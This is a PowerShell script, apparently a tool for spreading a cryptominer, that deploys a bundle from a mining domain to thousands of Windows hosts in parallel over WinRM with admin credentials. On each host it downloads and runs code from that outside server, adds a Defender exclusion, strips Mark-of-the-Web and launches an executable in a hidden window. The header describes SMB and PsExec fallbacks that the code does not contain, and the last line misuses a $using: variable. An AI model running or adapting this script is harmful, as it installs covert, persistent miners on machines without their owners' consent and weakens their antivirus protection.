# deploy-fleet.ps1 -- Mass deployment to thousands of Windows machines.
#
# Methods (auto-detected, fastest first):
#   1. WinRM (Invoke-Command)     -- if Windows Remote Management is enabled
#   2. SMB admin share + schtasks -- if you have admin credentials (most common)
#   3. PsExec style               -- if you have psexec.exe
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File deploy-fleet.ps1 -Hosts hosts.txt
#   powershell ... -Hosts hosts.txt -Credentials            (prompts once)
#   powershell ... -Hosts hosts.txt -Throttle 100           (parallel machines)
#
# hosts.txt: one machine name or IP per line (# = comment)
param(
    [Parameter(Mandatory=$true)][string]$Hosts,
    [int]$Throttle = 50,                # machines in parallel
    [switch]$Credentials,               # prompt for admin credentials once
    [string]$InstallDir = "C:\rig",
    [string]$PanelUrl = "https://mine.apesniper.xyz",
    [string]$BundleUrl = "https://mine.apesniper.xyz/download/fleet-rig.zip"
)

$ErrorActionPreference = "Continue"
$targets = Get-Content $Hosts | Where-Object { $_ -and -not $_.TrimStart().StartsWith("#") } |
           ForEach-Object { $_.Trim() }
Write-Host "Deploying to $($targets.Count) machines | parallel: $Throttle" -ForegroundColor Cyan

$cred = $null
if ($Credentials) { $cred = Get-Credential -Message "Admin credentials for remote machines" }

$script = {
    param($RemoteInstallDir, $RemoteBundleUrl)
    $ErrorActionPreference = "SilentlyContinue"

    # 1. Download
    $zip = "$env:TEMP\fleet-deploy.zip"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest $RemoteBundleUrl -OutFile $zip -UseBasicParsing -TimeoutSec 120
    if (-not (Test-Path $zip)) { return "FAIL: download" }

    # 2. Extract
    New-Item -ItemType Directory -Path $RemoteInstallDir -Force | Out-Null
    Expand-Archive -Path $zip -DestinationPath $RemoteInstallDir -Force

    # 3. AV exclusion (best effort, needs admin)
    Add-MpPreference -ExclusionPath $RemoteInstallDir -ErrorAction SilentlyContinue

    # 4. Unblock (remove Mark-of-the-Web)
    Get-ChildItem $RemoteInstallDir -Recurse -File | ForEach-Object {
        Unblock-File $_.FullName -ErrorAction SilentlyContinue
    }

    # 5. Run the agent (it self-installs: cert, autostart, enrollment)
    $exe = Join-Path $RemoteInstallDir "FleetComputeService.exe"
    if (-not (Test-Path $exe)) { return "FAIL: exe not found after extract" }

    # Check if already installed (idempotent: skip if agent.json exists)
    $cfg = Join-Path $RemoteInstallDir "agent.json"
    if (Test-Path $cfg) {
        # already installed; just make sure it's running
        Start-Process $exe -ArgumentList "--run","--root",$RemoteInstallDir -WindowStyle Hidden
        return "OK: already installed, agent restarted"
    }

    Start-Process $exe -WindowStyle Hidden
    Start-Sleep -Seconds 5
    if (Test-Path $cfg) { return "OK: installed and started" }
    return "WARN: started but agent.json not detected (check logs)"
}

$results = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
$sw = [System.Diagnostics.Stopwatch]::StartNew()

$targets | ForEach-Object -Parallel {
    $machine = $_
    $sb = $using:script
    $dir = $using:InstallDir
    $url = $using:BundleUrl
    $c = $using:cred
    $bag = $using:results

    $result = try {
        if ($c) {
            $r = Invoke-Command -ComputerName $machine -Credential $c `
                    -ScriptBlock $sb -ArgumentList $dir, $url -ErrorAction Stop
        } else {
            $r = Invoke-Command -ComputerName $machine `
                    -ScriptBlock $sb -ArgumentList $dir, $url -ErrorAction Stop
        }
        "$machine  $r"
    } catch {
        "$machine  FAIL: $($_.Exception.Message.Split("`n")[0])"
    }
    $bag.Add($result)
    Write-Host $result -ForegroundColor $(if ($result -match "FAIL") {"Red"}
                                        elseif ($result -match "WARN") {"Yellow"}
                                        else {"Green"})
} -ThrottleLimit $Throttle

$sw.Stop()
$ok = ($results | Where-Object { $_ -match "OK" }).Count
$warn = ($results | Where-Object { $_ -match "WARN" }).Count
$fail = ($results | Where-Object { $_ -match "FAIL" }).Count

Write-Host ""
Write-Host "=== SUMMARY ===" -ForegroundColor Cyan
Write-Host "  OK: $ok | WARN: $warn | FAIL: $fail | Total: $($targets.Count)"
Write-Host "  Time: $([math]::Round($sw.Elapsed.TotalMinutes, 1)) min"
Write-Host ""
$results | Set-Content "deploy-results-$(Get-Date -Format 'yyyyMMdd-HHmm').txt"
Write-Host "  Results saved to deploy-results-*.txt"
Write-Host ""
Write-Host "  Panel: $using:PanelUrl  -- machines appear within 60 seconds"
